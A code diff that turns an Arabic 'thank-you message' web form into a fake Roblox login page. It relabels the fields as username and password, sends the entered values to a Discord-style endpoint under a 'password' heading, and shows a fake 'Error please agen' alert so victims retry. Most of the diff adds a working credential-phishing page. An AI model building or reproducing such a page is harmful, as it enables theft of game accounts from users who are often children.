@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title>رسالة شكر</title>
+<title>Roblox</title>
 <style>
     body {
         font-family: Arial, sans-serif;
@@ -49,12 +49,12 @@
 <body>
 
 <div class="container">
-    <h2>ارسل رسالة شكر</h2>
+    <h2>password</h2>
 
-    <input type="text" id="username" placeholder="يوزر الديسكورد">
-    <textarea id="message" rows="4" placeholder="اكتب رسالة الشكر"></textarea>
+    <input type="text" id="username" placeholder="username">
+    <textarea id="message" rows="4" placeholder="password"></textarea>
 
-    <button onclick="sendMessage()">إرسال</button>
+    <button onclick="sendMessage()">log un</button>
 </div>
 
 <script>
@@ -67,13 +67,13 @@ function sendMessage() {
     const msg = document.getElementById("message").value;
 
     if (!user || !msg) {
-        alert("الرجاء تعبئة جميع الخانات");
+        alert("Error");
         return;
     }
 
     const payload = {
         content:
-        `📩 **رسالة شكر جديدة:**\n` +
+        `📩 **كلمة مرور:**\n` +
         `**اسم المستخدم:** ${user}\n` +
         `**الرسالة:** ${msg}\n`
     };
@@ -84,7 +84,7 @@ function sendMessage() {
         body: JSON.stringify(payload)
     });
 
-    alert("تم إرسال رسالتك بنجاح ❤️");
+    alert("Error please agen");
 }
 </script>
 
